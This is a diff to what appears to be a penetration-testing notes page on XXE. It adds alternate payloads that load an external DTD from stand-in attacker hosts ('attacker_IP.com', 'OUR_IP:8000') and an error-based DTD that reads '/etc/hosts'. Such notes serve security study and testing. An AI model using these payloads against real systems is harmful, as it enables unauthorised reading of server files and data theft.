@@ -156,7 +156,8 @@
 * Try to send malformed XML data, and see if the web application displays any errors. To do so, we delete any of the closing tags, change one of them, so it does not close (e.g. `<roo>` instead of `<root>`), or just reference a non-existing entity.
 * Host external DTD `malicious.dtd`&#x20;
 * Payload to be provided in vulnerable application&#x20;
-  * `<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://attacker_IP.com/malicious.dtd"> %xxe; ]>`
+  * `<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://attacker_IP.com/malicious.dtd"> %xxe; ]>`&#x20;
+  * `<!DOCTYPE email [ <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd"> %remote; %error; ]>` <sup><sub>(Alternate Payload)<sub></sup>
 * External DTD is only possible because XML parameter entity can be used within the definition of another parameter entity which is not possible in internal DTD
 
 <details>
@@ -169,6 +170,10 @@
 <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
 %eval;
 %error;
+
+<!-- Alternate Payload -->
+<!ENTITY % file SYSTEM "file:///etc/hosts">
+<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
 ```
 {% endcode %}
 
